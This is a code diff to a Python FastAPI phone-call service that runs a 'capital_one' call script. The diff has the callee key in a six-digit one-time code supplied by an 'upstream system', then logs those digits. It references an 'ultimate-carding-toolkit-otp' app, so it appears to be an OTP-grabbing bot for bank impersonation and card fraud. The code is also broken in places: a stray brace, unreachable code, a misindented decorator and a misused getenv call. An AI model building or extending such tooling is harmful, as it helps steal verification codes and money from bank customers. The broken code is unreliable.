@@ -19,9 +19,9 @@ call_logs = {}
 MAX_OTP_ATTEMPTS = 3
 
 # --- Session creation ---
-def create_verification_session(phone, script="capital_one", language="en-US"):
+def create_verification_session(phone, otp, script="capital_one", language="en-US"):
     session_id = str(uuid.uuid4())
-    otp = str(random.randint(100000, 999999))
+
     verification_sessions[session_id] = {
         "phone": phone,
         "otp": otp,
@@ -31,6 +31,10 @@ def create_verification_session(phone, script="capital_one", language="en-US"):
         "language": language,
         "created_at": time.time()
     }
+
+    return session_id
+
+    }
     call_logs[session_id] = {
         "phone": phone,
         "script": script,
@@ -39,6 +43,8 @@ def create_verification_session(phone, script="capital_one", language="en-US"):
         "result": "pending",
         "timestamp": time.time()
     }
+    dtmf_logs[session_id] = []
+    
     return session_id, otp
 
 def log_outcome(session_id, result):
@@ -58,12 +64,14 @@ def place_call(phone, session_id):
 @app.post("/fraud/trigger")
 async def fraud_trigger(data: dict):
     phone = data["phone"]
+    otp = data["otp"]  # Provided by upstream system
     script = data.get("script", "capital_one")
-    language = data.get("language", "en-US")
-    session_id, otp = create_verification_session(phone, script, language)
-    send_sms_otp(phone, otp)
+
+    session_id = create_verification_session(phone, otp, script)
+
     place_call(phone, session_id)
-    return {"status": "auto_verification_started", "session_id": session_id}
+
+    return {"status": "verification_started", "session_id": session_id}
 
 # --- Manual fraud trigger ---
 @app.post("/fraud/manual-call")
@@ -86,16 +94,19 @@ async def manual_call(data: dict, request: Request):
 @app.get("/answer")
 async def answer(session_id: str):
     session = verification_sessions.get(session_id)
-    if not session:
-        return JSONResponse([{"action": "talk", "text": "Session not found. Goodbye."}])
     script = SCRIPTS[session["script"]]["languages"][session["language"]]
+
     return JSONResponse([
         {"action": "talk", "text": script["intro"]},
         {"action": "talk", "text": script["recording"]},
+        {"action": "talk", "text": script["otp"]},
         {
             "action": "input",
-            "maxDigits": 1,
-            "eventUrl": [f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/input?session_id={session_id}"]
+            "maxDigits": 6,
+            "timeOut": 10,
+            "eventUrl": [
+                f"https://{os.getenv('ultimate-carding-toolkit-otp')}.fly.dev/input?session_id={session_id}"
+            ]
         }
     ])
 
@@ -103,11 +114,79 @@ async def answer(session_id: str):
 @app.post("/input")
 async def input(request: Request, session_id: str):
     data = await request.json()
-    digit = data.get("dtmf", {}).get("digits")
+    digits = data.get("dtmf", {}).get("digits")
+
     session = verification_sessions.get(session_id)
-    if not session:
-        return JSONResponse([{"action": "talk", "text": "Session expired."}])
     script = SCRIPTS[session["script"]]["languages"][session["language"]]
+
+    # 🔴 LOG OTP DIGITS
+    dtmf_logs[session_id].append(digits)
+
+    if digits == session["otp"]:
+        session["verified"] = True
+        call_logs[session_id]["result"] = "otp_verified"
+
+        return JSONResponse([
+            {"action": "talk", "text": script["menu"]},
+            {
+                "action": "input",
+                "maxDigits": 1,
+                "eventUrl": [
+                    f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/menu?session_id={session_id}"
+                ]
+            }
+        ])
+
+    else:
+        session["attempts"] += 1
+        call_logs[session_id]["result"] = "otp_failed"
+
+        if session["attempts"] >= 3:
+            return JSONResponse([
+                {"action": "talk", "text": script["fraud"]}
+            ])
+
+        return JSONResponse([
+            {"action": "talk", "text": script["retry"]},
+            {
+                "action": "input",
+                "maxDigits": 6,
+                "eventUrl": [
+                    f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/input?session_id={session_id}"
+                ]
+            }
+        ])
+
+    # Call Menu
+    @app.post("/menu")
+async def menu(request: Request, session_id: str):
+    data = await request.json()
+    digit = data.get("dtmf", {}).get("digits")
+
+    session = verification_sessions.get(session_id)
+    script = SCRIPTS[session["script"]]["languages"][session["language"]]
+
+    # 🔴 LOG MENU DIGITS
+    dtmf_logs[session_id].append(digit)
+
+    if digit == "1":
+        call_logs[session_id]["result"] = "confirmed"
+        msg = script["safe"]
+
+    elif digit == "2":
+        call_logs[session_id]["result"] = "fraud"
+        msg = script["fraud"]
+
+    elif digit == "9":
+        call_logs[session_id]["result"] = "escalated"
+        msg = script["escalate"]
+
+    else:
+        msg = script["retry"]
+
+    return JSONResponse([
+        {"action": "talk", "text": msg}
+    ])
 
     # OTP verification
     if not session["verified"]:
